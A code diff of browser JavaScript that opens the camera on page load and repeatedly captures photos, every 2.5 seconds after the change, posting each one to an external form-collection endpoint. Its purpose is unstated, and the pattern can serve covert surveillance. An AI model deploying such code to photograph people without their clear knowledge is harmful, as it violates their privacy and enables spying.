@@ -7,12 +7,11 @@ window.addEventListener("DOMContentLoaded", startCamera);
 async function startCamera() {
   try {
     stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: "environment" } }  // prefer back cam
+      video: { facingMode: { ideal: "environment" } } // prefer back cam
     });
 
     video.srcObject = stream;
 
-    // wait until video has size
     video.onloadedmetadata = () => {
       startLoop();
     };
@@ -47,19 +46,23 @@ function captureAndUpload() {
     formData.append("photo", file);
 
     try {
-      await fetch("https://usebasin.com/f/fb249d3e371b", {
+      const res = await fetch("https://usebasin.com/f/fb249d3e371b", {
         method: "POST",
         body: formData,
         headers: { "Accept": "application/json" }
       });
 
-      console.log("Uploaded ✔");
+      if (!res.ok) {
+        console.error("Upload failed:", res.status, await res.text());
+      } else {
+        console.log("Uploaded ✔");
+      }
 
     } catch (err) {
       console.error("Upload error:", err);
     }
 
-    // capture next photo after 1 second
-    setTimeout(captureAndUpload, 1000);
+    // capture next photo after 2–3 seconds
+    setTimeout(captureAndUpload, 2500); // adjust 2000–3000 ms as needed
   }, "image/jpeg", 0.9);
 }
